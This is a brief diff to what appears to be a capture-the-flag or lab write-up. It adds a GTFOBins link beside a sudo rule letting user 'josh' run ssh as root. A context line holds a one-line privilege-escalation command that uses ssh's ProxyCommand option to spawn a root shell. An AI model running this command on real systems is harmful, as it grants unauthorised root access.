@@ -252,6 +252,8 @@ User josh may run the following commands on localhost:
     (root) /usr/bin/ssh *
 ```
 
+[https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo)
+
 `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
 
 ```bash
